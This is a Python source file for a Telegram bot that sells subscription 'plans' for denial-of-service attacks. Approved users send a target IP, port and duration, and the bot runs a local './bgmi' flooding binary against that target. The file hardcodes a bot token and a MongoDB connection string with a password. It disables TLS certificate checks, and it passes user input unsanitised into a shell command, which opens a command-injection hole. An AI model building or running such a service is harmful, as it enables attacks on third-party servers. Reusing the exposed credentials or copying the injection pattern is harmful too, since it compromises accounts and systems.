import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

loop = asyncio.get_event_loop()

# Configurations
TOKEN = '7149714912:AAEeGl6cSo1IG3y6Tuf6aomE62Uoc5Xtqjw'
MONGO_URI = 'mongodb+srv://darklordxyt5_db_user:4zD4qtnSfpJg6W4H@blacky.qcxw8sv.mongodb.net/?retryWrites=true&w=majority&appName=blacky'
FORWARD_CHANNEL_ID = -1003886707055
CHANNEL_ID = -1003886707055
error_channel_id = -1003886707055

# MongoDB Connection with SSL Fix
try:
    # tlsAllowInvalidCertificates=True helps bypass the SSL Handshake error on Debian/Cloudways
    client = MongoClient(
        MONGO_URI, 
        tlsCAFile=certifi.where(),
        tlsAllowInvalidCertificates=True,
        serverSelectionTimeoutMS=5000
    )
    db = client['VENOM']
    users_collection = db.users
    client.admin.command('ping')
    logging.info("✅ MongoDB connected successfully!")
except Exception as e:
    logging.error(f"❌ MongoDB Connection Failed: {e}")

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# --- Helper Functions ---

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

async def run_attack_command_async(target_ip, target_port, duration):
    # Ensure './bgmi' has executable permissions: chmod +x bgmi
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 500")
    await process.communicate()

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# --- Bot Handlers ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id, CHANNEL_ID):
        bot.send_message(chat_id, "*❌ You are not authorized*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Usage: /approve <id> <plan> <days> or /disapprove <id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    
    if action == '/approve':
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 1
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 30
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg = f"✅ User {target_user_id} approved (Plan {plan}) for {days} days."
    else:
        users_collection.update_one({"user_id": target_user_id}, {"$set": {"plan": 0}})
        msg = f"❌ User {target_user_id} disapproved."

    bot.send_message(chat_id, msg)

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data or user_data.get('plan', 0) == 0:
        bot.send_message(message.chat.id, "❌ Access Denied. Contact Admin.")
        return

    bot.send_message(message.chat.id, "*Enter Target IP, Port, and Duration (e.g. 1.1.1.1 80 60)*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❌ Invalid Format.")
            return
        
        target_ip, target_port, duration = args[0], int(args[1]), args[2]
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, "❌ Port Blocked.")
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"🚀 Attack Started!\nTarget: {target_ip}:{target_port}\nTime: {duration}s")
    except Exception as e:
        logging.error(f"Attack Process Error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            res = f"👤 User: {message.from_user.first_name}\n📊 Plan: {user_data.get('plan')}\n📅 Valid: {user_data.get('valid_until')}"
        else:
            res = "❌ No account found."
        bot.reply_to(message, res)
    elif message.text == "Instant++ Plan 💥":
        attack_command(message)
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "Contact @BLACK_XOWNER")

# --- Execution ---

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

if __name__ == "__main__":
    Thread(target=start_asyncio_thread, daemon=True).start()
    logging.info("🤖 Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling Error: {e}")
            time.sleep(5)
